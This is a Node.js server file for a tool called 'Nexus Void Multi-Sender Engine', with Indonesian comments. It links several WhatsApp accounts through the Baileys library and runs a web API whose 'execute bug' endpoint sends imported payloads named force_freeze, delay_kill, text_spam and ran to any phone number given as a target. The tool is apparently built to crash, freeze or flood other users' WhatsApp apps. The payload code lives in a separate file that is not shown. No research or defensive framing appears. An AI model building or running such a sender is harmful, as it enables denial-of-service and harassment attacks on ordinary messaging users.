// server.js — Nexus Void Multi-Sender Engine
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import P from 'pino';
import QRCode from 'qrcode';
import makeWASocket, { 
  useMultiFileAuthState, 
  DisconnectReason, 
  Browsers 
} from '@whiskeysockets/baileys';

import { ran, text_spam, delay_kill, force_freeze } from './payload.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const PORT = process.env.PORT || 3000;

// Map buat nyimpen banyak sender
// format: { "6281234": { sock, status, pairingCode, qr } }
const senders = new Map();

async function createSender(phone) {
  if (senders.has(phone)) return senders.get(phone);

  const authDir = `./auth_${phone}`;
  const { state, saveCreds } = await useMultiFileAuthState(authDir);
  
  const sock = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.macOS('Desktop'), 
    auth: state,
    syncFullHistory: false,
    generateHighQualityLinkPreview: false,
  });

  sock.ev.on('creds.update', saveCreds);

  const senderData = {
    phone,
    sock,
    status: sock.authState.creds.registered ? 'connecting' : 'need_pairing',
    pairingCode: null,
    qr: null
  };

  senders.set(phone, senderData);

  sock.ev.on('connection.update', async (u) => {
    const { connection, lastDisconnect, qr } = u;
    const s = senders.get(phone);
    
    if (qr && !sock.authState.creds.registered) {
      s.qr = await QRCode.toDataURL(qr, { width: 300 });
    }

    if (connection === 'open') {
      s.status = 'connected';
      s.pairingCode = null;
      s.qr = null;
      console.log(`[wa] ${phone} connected`);
    }

    if (connection === 'close') {
      s.status = 'offline';
      s.qr = null;
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut) {
        setTimeout(() => createSender(phone).catch(console.error), 5000);
      }
    }
  });

  return senderData;
}

// Otomatis load sender yang udah pernah login pas server nyala
import fs from 'fs';
if (fs.existsSync('.')) {
  fs.readdirSync('.').forEach(dir => {
    if (dir.startsWith('auth_')) {
      const phone = dir.replace('auth_', '');
      createSender(phone).catch(console.error);
    }
  });
}

function toJid(target) {
  if (target.includes('@')) return target;
  const num = String(target).replace(/[^0-9]/g, '');
  return `${num}@s.whatsapp.net`;
}

// Endpoint List Sender
app.get('/api/status', (req, res) => {
  const list = Array.from(senders.values()).map(s => ({
    phone: s.phone,
    status: s.status,
    pairingCode: s.pairingCode,
    qr: s.qr
  }));
  res.json({ senders: list });
});

// Endpoint Nambah Sender / Minta Kode
app.post('/api/pair', async (req, res) => {
  let { phone } = req.body;
  if (!phone) return res.status(400).json({ ok: false, error: 'phone required' });

  phone = String(phone).replace(/[^0-9]/g, '');
  if (phone.startsWith('0')) phone = '62' + phone.slice(1);

  try {
    const sender = await createSender(phone);
    if (sender.status === 'connected') {
      return res.json({ ok: false, error: 'Nomor sudah terhubung' });
    }
    
    const code = await sender.sock.requestPairingCode(phone);
    sender.pairingCode = code;
    sender.status = 'waiting_pair';
    
    res.json({ ok: true, code });
  } catch (e) { 
    res.status(500).json({ ok: false, error: String(e?.message || e) }); 
  }
});

// Endpoint Eksekusi Bug (Pilih Sender)
app.post('/api/send', async (req, res) => {
  const { target, type, senderPhone } = req.body;
  if (!target || !senderPhone) return res.status(400).json({ ok: false, error: 'target & sender required' });

  const sender = senders.get(senderPhone);
  if (!sender || sender.status !== 'connected') {
    return res.status(400).json({ ok: false, error: 'Sender belum terhubung' });
  }

  try {
    const jid = toJid(target);
    if (type === 'ran') await ran(sender.sock, jid);
    else if (type === 'text') await text_spam(sender.sock, jid);
    else if (type === 'delay_kill') await delay_kill(sender.sock, jid);
    else if (type === 'force_freeze') await force_freeze(sender.sock, jid);
    else return res.status(400).json({ ok: false, error: 'unknown payload' });
    
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false, error: String(e?.message || e) });
  }
});

app.listen(PORT, '0.0.0.0', () => console.log(`[web] listening on port ${PORT}`));